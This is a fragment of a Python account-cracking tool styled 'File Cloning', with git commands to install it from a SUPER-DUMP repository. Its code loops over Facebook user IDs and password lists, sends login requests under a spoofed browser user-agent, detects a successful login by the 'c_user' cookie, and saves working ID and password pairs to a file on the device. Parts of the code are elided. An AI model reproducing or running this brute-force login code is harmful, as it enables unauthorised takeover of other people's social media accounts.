...
git clone --depth=1 https://github.com/MR-CRAZY-404-XD/SUPER-DUMP.git

cd SUPER-DUMP

git pull

python SUPER-DUMP.py____ _____ ______ _______ 
...
\______   \_____  |  | _____ __  _  _______  |  |   
 |    |  _/\__  \ |  | \__  \\ \/ \/ /\__  \ |  |   
 |    |   \ / __ \|  |__/ __ \\     /  / __ \|  |__ 
 |______  /(____  /____(____  /\/\_/  (____  /____/ 
        \/      \/          \/             \/       
                              

          
\033[47m\033[1;31m New series hy agr mix wala scene chiya to paid use karo  \033[41m\033[1;37m FOR ALL. \x1b[0m
\033[1;37m----------------------------------------------
 Author    : Balawal Saleem
 Facebook  :  Balawal Saleem
 Tool Name : File Cloing 
 Version   : PERSONAL
\033[1;37m----------------------------------------------
...
def ikb():
    ...
    print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] VERSION  :\x1b[1;921.2\x1b[1;97m  ')         
    print(47*'-')
    print('[01] File Cloing')
    print('[02] My Youtube')
    print(47*'-')
...
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Balawal ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',}
                        ...
                        if "c_user" in IK:
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('/sdcard/LOLIP-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
